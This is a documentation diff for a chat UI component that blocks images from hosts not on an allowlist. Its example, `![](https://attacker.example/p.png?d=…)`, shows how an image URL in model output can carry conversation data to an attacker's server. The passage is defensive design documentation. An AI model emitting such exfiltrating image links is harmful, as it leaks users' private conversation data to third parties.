@@ -242,7 +242,7 @@ A whole assistant `UIMessage`, part by part: streaming-safe markdown (unterminat
 />
 ```
 
-Images in text and reasoning do not load unless their host is allowed: a URL in model output can carry data out of the conversation as soon as the browser fetches it (`![](https://attacker.example/p.png?d=…)`), so by default an image renders as a link with its alt text. Allow the hosts you trust, or `'*'` for any:
+Images in text and reasoning do not load unless their host is allowed: a URL in model output can carry data out of the conversation as soon as the browser fetches it (`![](https://attacker.example/p.png?d=…)`), so by default an image renders as a link with its alt text, or as plain text inside the link it belongs to (a badge). Allow the hosts you trust, or `'*'` for any:
 
 ```tsx
 <AgentMessage message={last} allowedImageHosts={['images.example.com']} />
